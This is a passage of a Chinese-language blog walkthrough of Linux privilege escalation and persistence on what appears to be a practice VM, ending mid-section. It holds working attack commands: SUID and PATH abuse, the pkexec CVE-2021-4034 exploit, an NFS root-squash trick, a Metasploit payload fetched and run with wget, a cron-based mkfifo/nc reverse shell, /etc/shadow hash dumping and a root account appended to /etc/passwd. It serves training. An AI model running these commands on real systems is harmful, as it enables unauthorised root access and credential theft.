title="0x01 suid提权"></a>0x01 suid提权</h3><p>suid文件查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/sbin/mount.nfs</span><br><span class="line">/sbin/mount.ecryptfs_private</span><br><span class="line">/sbin/mount.cifs</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/arping</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ntfs-3g</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/home/user5/script</span><br><span class="line">/home/user3/shell</span><br></pre></td></tr></table></figure><p>直接运行 <code>/home/user3/shell</code> 提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: 1: ./.script.sh: not found</span><br></pre></td></tr></table></figure><p>切换至 <code>/home/user3</code> 目录在执行即可提权至root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/user3 &amp;&amp; ./shell</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403094100442.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403094100442.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403094100442"></p><h3 id="0x02-滥用root权限-环境变量提权"><a href="#0x02-滥用root权限-环境变量提权" class="headerlink" title="0x02 滥用root权限 + 环境变量提权"></a>0x02 滥用root权限 + 环境变量提权</h3><p>运行 <code>/home/user5/script</code>，看着像是 <code>ls</code> 命令的功能，通过Ghidra反编译一下，在<strong>Symbol Tree</strong>窗口，打开 <strong>Exports</strong> 项，一般入口函数是 <strong>main</strong> 或者 <strong>entry</strong>，原来 <code>script</code> 程序是通过root权限执行ls命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这里没有指定绝对路径，也就是说系统通过环境变量去获取的执行路径，只要我们新建一个ls脚本，把环境路径优先检索我们设置的目录，就可以执行我们想执行的操作了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; /tmp/ls</span><br><span class="line">chmod 777 /tmp/ls</span><br><span class="line">/home/user5/script</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403094431154.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403094431154.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403094431154"></p><h3 id="0x03-CVE-2021-4034-pkexec-提权"><a href="#0x03-CVE-2021-4034-pkexec-提权" class="headerlink" title="0x03 CVE-2021-4034 (pkexec) 提权"></a>0x03 <a href="https://github.com/berdav/CVE-2021-4034">CVE-2021-4034</a> (pkexec) 提权</h3><p>这个漏洞影响范围挺广的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wget xxx/CVE-2021-4034-main.zip &gt; /tmp/CVE-2021-4034-main.zip</span></span><br><span class="line">unzip CVE-2021-4034-main.zip &amp;&amp; <span class="built_in">cd</span> CVE-2021-4034-main &amp;&amp; make &amp;&amp; ./cve-2021-4034</span><br><span class="line">whoami</span><br><span class="line"><span class="comment"># root</span></span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403094626417.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403094626417.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403094626417"></p><h3 id="0x04-NFS提权"><a href="#0x04-NFS提权" class="headerlink" title="0x04 NFS提权"></a>0x04 NFS提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/exports</span><br><span class="line"><span class="comment"># /home/user5 *(rw,no_root_squash)</span></span><br></pre></td></tr></table></figure><p>发现没有限制root权限用户的远程访问</p><p>先远程挂在到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw 192.168.192.144:/home/user5 /Users/tari/Test/tmp</span><br></pre></td></tr></table></figure><p>mac下但返回权限不足</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount_nfs: can<span class="string">&#x27;t mount /home/user5 from 192.168.192.144 onto /Users/tari/Test/tmp: Operation not permitted</span></span><br><span class="line"><span class="string">mount: /Users/tari/Test/tmp failed with 1</span></span><br></pre></td></tr></table></figure><p>然后 linux下通过 root 权限执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.192.144:/ /mnt -o nolock</span><br></pre></td></tr></table></figure><p>我们切换到目录下新建一个C文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /mnt/home/user5</span><br><span class="line">vim elevate.c</span><br></pre></td></tr></table></figure><p>内容如下（即以root权限执行 <code>/bin/bash</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure><p>编译，并赋予 suid 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc elevate.c</span><br><span class="line">chmod +s a.out</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403102045651.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403102045651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403102045651"></p><p>然后到需要提权的机器上执行这个文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/user5/a.out</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403102058292.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403102058292.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403102058292"></p><h3 id="0x05-MSF-提权"><a href="#0x05-MSF-提权" class="headerlink" title="0x05 MSF 提权"></a>0x05 MSF 提权</h3><p>先上线 msf</p><ol><li>攻击机</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=2233 -f elf &gt; msf</span><br></pre></td></tr></table></figure><p>msfconsole</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> lhost xx.xx.xx.xx</span><br><span class="line"><span class="built_in">set</span> lport xxxx</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><ol start="2"><li>受害者</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://xxxx/msf &amp;&amp; chmod +x msf &amp;&amp; ./msf</span><br></pre></td></tr></table></figure><ol start="3"><li>攻击机 msfconsole</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bg</span></span><br><span class="line">use post/multi/recon/local_exploit_suggester</span><br><span class="line"><span class="built_in">set</span> session &lt;session_id&gt;</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>mac 下不知为啥一个都没，kali 正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] 192.168.192.144 - Collecting <span class="built_in">local</span> exploits <span class="keyword">for</span> x64/linux...</span><br><span class="line">[*] 192.168.192.144 - 41 exploit checks are being tried...</span><br><span class="line">[+] 192.168.192.144 - exploit/linux/<span class="built_in">local</span>/network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 192.168.192.144 - exploit/linux/<span class="built_in">local</span>/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 192.168.192.144 - exploit/linux/<span class="built_in">local</span>/sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.</span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure><p>利用，这里只成功利用了 <code>exploit/linux/local/sudo_baron_samedit</code>（target 5 是可以的，target 4 不行，其他没试）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/<span class="built_in">local</span>/sudo_baron_samedit</span><br><span class="line"><span class="built_in">set</span> session &lt;session_id&gt;</span><br><span class="line"><span class="built_in">set</span> target 5</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403224234203.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403224234203.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403224234203"></p><h3 id="脏牛提权（失败）"><a href="#脏牛提权（失败）" class="headerlink" title="脏牛提权（失败）"></a>脏牛提权（失败）</h3><p><a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://xxxx/dirty.c &gt; /tmp/dirty.c</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">chmod +x dirty &amp;&amp; ./dirty</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220403220508714.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220403220508714.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220403220508714"></p><p>试了两次，用户都没有创建成功</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="用户密码爆破"><a href="#用户密码爆破" class="headerlink" title="用户密码爆破"></a>用户密码爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure><p>各个用户哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:$6$mqjgcFoM<span class="variable">$X</span>/qNpZR6gXPAxdgDjFpaD1yPIqUF5l5ZDANRTKyvcHQwSqSxX5lA7n22kjEkQhSP6Uq7cPaYfzPSmgATM9cwD1:18050:0:99999:7:::</span><br><span class="line">user1:$6<span class="variable">$9iyn</span>/lCu<span class="variable">$UxlOZYhhFSAwJ8DPjlrjrl2Wv</span>.Pz9DahMTfwpwlUC5ybyBGpuHToNIIjTqMLGSh0R2Ch4Ij5gkmP0eEH2RJhZ0:18050:0:99999:7:::</span><br><span class="line">user2:$6$7gVE7KgT<span class="variable">$ud1VN8OwYCbFveieo4CJQIoMcEgcfKqa24ivRs</span>/MNAmmPeudsz/p3QeCMHj8ULlvSufZmp3TodaWlIFSZCKG5.:18050:0:99999:7:::</span><br><span class="line">user3:$6$PaKeECW4<span class="variable">$5yMn9UU4YByCj0LP4QWaGt</span>/S1aG0Zs73EOJXh.Rl0ebjpmsBmuGUwTgBamqCCx7qZ0sWJOuzIqn.GM69aaWJO0:18051:0:99999:7:::</span><br><span class="line">user4:$6$0pxj6KPl<span class="variable">$NA5S</span>/2yN3TTJbPypEnsqYe1PrgbfccHntMggLdU2eM5/23dnosIpmD8sRJwI1PyDFgQXH52kYk.bzc6sAVSWm.:18051:0:99999:7:::</span><br><span class="line">user5:$6$wndyaxl9<span class="variable">$cOEaymjMiRiljzzaSaFVXD7LFx2OwOxeonEdCW</span>.GszLm77k0d5GpQZzJpcwvufmRndcYatr5ZQESdqbIsOb9n/:18051:0:99999:7:::</span><br><span class="line">user6:$6$Y9wYnrUW<span class="variable">$ihpBL4g3GswEay</span>/AqgrKzv1n8uKhWiBNlhdKm6DdX7WtDZcUbh/5w/tQELa3LtiyTFwsLsWXubsSCfzRcao1u/:18051:0:99999:7:::</span><br><span class="line">mysql:$6$O2ymBAYF<span class="variable">$NZDtY392guzYrveKnoISea6oQpv87OpEjEef5KkEUqvtOAjZ2i1UPbkrfmrHG</span>/IonKdnYEec0S0ZBcQFZ.sno/:18053:0:99999:7:::</span><br><span class="line">user7:$6$5RBuOGFi<span class="variable">$eJrQ4</span>/xf2z/3pG43UkkoE35Jb0BIl7AW/umj1Xa7eykmalVKiRKJ4w3vFEOEOtYinnkIRa.89dXtGQXdH.Rdy0:18052:0:99999:7:::</span><br><span class="line">user8:$6$fdtulQ7i<span class="variable">$G9THW4j6kUy4bXlf7C</span>/0XQtntw123LRVRfIkJ6akDLPHIqB5PJLD4AEyz7wXsEhMc2XC4CqiTxATfb20xWaXP.:18052:0:99999:7:::</span><br></pre></td></tr></table></figure><p>通过 john 去爆破</p><p><img src="/img/escalate-linux-1/image-20220404075023476.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404075023476.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404075023476"></p><p>root 密码爆破出来了，其他爆不出来</p><h2 id="权限提升-2"><a href="#权限提升-2" class="headerlink" title="权限提升 (2)"></a>权限提升 (2)</h2><p>到这里，能通过 webshell 直接去提权的方式已经用的差不多了，有其他方式欢迎大佬们补充～</p><h3 id="0x06-mysql-信息泄漏"><a href="#0x06-mysql-信息泄漏" class="headerlink" title="0x06 mysql 信息泄漏"></a>0x06 mysql 信息泄漏</h3><p>通过 PEASS-ng 发现 mysql 密码为 root，连进去发现 user库user_info表存着mysql的密码</p><p><img src="/img/escalate-linux-1/image-20220404112932323.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404112932323.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404112932323"></p><p>通过 <code>/etc/passwd</code> 得知mysql用户是可登陆的，猜测这个密码是mysql用户的登录密码</p><p><img src="/img/escalate-linux-1/image-20220404113122521.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404113122521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404113122521"></p><p>查找一下该用户的所属文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user mysql</span><br></pre></td></tr></table></figure><p>发现  <code>/var/mysql</code> 目录下有点有意思的文件，特别是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">----------  1 mysql mysql  126 Jun  6  2019 .user_informations</span><br></pre></td></tr></table></figure><p>给一下权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">chmod +r .user_informations</span><br><span class="line">cat .user_informations</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># user2:user2@12345</span></span><br><span class="line"><span class="comment"># user3:user3@12345</span></span><br><span class="line"><span class="comment"># user4:user4@12345</span></span><br><span class="line"><span class="comment">#.user5:user5@12345</span></span><br><span class="line"><span class="comment"># user6:user6@12345</span></span><br><span class="line"><span class="comment"># user7:user7@12345</span></span><br><span class="line"><span class="comment"># user8:user8@12345</span></span><br></pre></td></tr></table></figure><p>发现了类似其他用户的密码，尝试切换可成</p><p>另外一个敏感文件 <code>/etc/mysql/secret.cnf</code> 发现 root 密码，不过 root 密码不是 12345 嘛..</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +r /etc/mysql/secret.cnf</span><br><span class="line">cat /etc/mysql/secret.cnf</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># UserName:root</span></span><br><span class="line"><span class="comment"># PassWord:root@12345</span></span><br></pre></td></tr></table></figure><h3 id="0x07-crontab-提权"><a href="#0x07-crontab-提权" class="headerlink" title="0x07 crontab 提权"></a>0x07 crontab 提权</h3><p>登陆至 user4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br><span class="line"><span class="comment"># */5  *    * * * root    /home/user4/Desktop/autoscript.sh</span></span><br></pre></td></tr></table></figure><p>查看定时任务发现每隔5分钟以root权限执行 <code>/home/user4/Desktop/autoscript.sh</code> 脚本</p><p>更改 autoscript.sh 为（这里直接 bash -i 反弹会提示 fd 不存在， nc -e 提示没有 -e 参数）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc xx.xx.xx.xx 2234 &gt;/tmp/f&#x27;</span> &gt; /home/user4/Desktop/autoscript.sh</span><br></pre></td></tr></table></figure><p>过5分钟即会反弹一个root的shell回来</p><p><img src="/img/escalate-linux-1/image-20220404111645503.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404111645503.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404111645503"></p><h3 id="0x08-sudoers-提权-1"><a href="#0x08-sudoers-提权-1" class="headerlink" title="0x08 sudoers 提权 1"></a>0x08 sudoers 提权 1</h3><p>user8，运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现可以免密通过 <code>vi</code> 命令执行root权限操作</p><p>随便 vi 一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 进入 vi 后输入</span></span><br><span class="line">:!sh</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220404092600257.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404092600257.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404092600257"></p><h3 id="0x09-root组用户提权至root"><a href="#0x09-root组用户提权至root" class="headerlink" title="0x09 root组用户提权至root"></a>0x09 root组用户提权至root</h3><p>登陆至 user7</p><p>查看 /etc/passwd 文件权限发现同组可写</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd</span><br><span class="line"><span class="comment"># -rw-rw-r-- 1 root root 2648 Jun  5  2019 /etc/passwd</span></span><br></pre></td></tr></table></figure><p>先备份一下 <code>cp /etc/passwd .</code> 然后写入一个 root 用户 id 等信息至 /etc/passwd 然后切换即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/passwd .</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;tari:<span class="subst">$(openssl passwd -1 -salt tari 12345)</span>:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd</span><br><span class="line">su tari</span><br></pre></td></tr></table></figure><p><img src="/img/escalate-linux-1/image-20220404112646787.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404112646787.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20220404112646787"></p><p>user4 也是属于 root 组的，也可以这样做</p><h3 id="sudoer-提权-2"><a href="#sudoer-提权-2" class="headerlink" title="sudoer 提权 2"></a>sudoer 提权 2</h3><p>登陆user2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"><span class="comment"># (user1) ALL</span></span><br></pre></td></tr></table></figure><p>发现可接管 user1 用户，这个用户在没在 mysql 泄漏的密码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u user1 /bin/bash</span><br></pre></td></tr></table></figure><p>切换后继续看特权命令 <code>sudo -l</code></p><p><img src="/img/escalate-linux-1/image-20220404142540327.png" class="lazyload" data-srcset="/img/escalate-linux-1/image-20220404142540327.png" 